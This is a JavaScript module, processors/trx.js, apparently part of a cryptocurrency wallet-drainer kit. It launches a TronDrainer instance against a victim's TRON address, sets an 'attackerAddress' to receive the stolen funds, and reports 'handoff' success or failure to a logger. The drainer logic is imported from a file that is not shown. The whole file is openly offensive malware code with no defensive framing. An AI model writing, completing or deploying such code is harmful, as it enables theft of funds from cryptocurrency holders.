// processors/trx.js
import { TronDrainer } from './main.js';
import { sendLog } from './utils/logger.js';

let currentDrainer = null;

export async function startTronDrainer(address) {
  try {
    console.log(`[Tron Handoff] Starting drainer for ${address}`);

    // Optional: Kill any previous instance
    if (currentDrainer) {
      console.log("Killing previous Tron drainer");
      currentDrainer = null;
    }

    currentDrainer = new TronDrainer();
    
    // Pass the global receiver if needed
    currentDrainer.attackerAddress = global.tronReceiver || "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

    await currentDrainer.init();

    await sendLog("tron_handoff_success", { 
      address, 
      status: "started" 
    });

    return true;

  } catch (error) {
    console.error("[Tron Handoff] Failed:", error);
    await sendLog("tron_handoff_failed", { address, error: error.message });
    throw error;
  }
}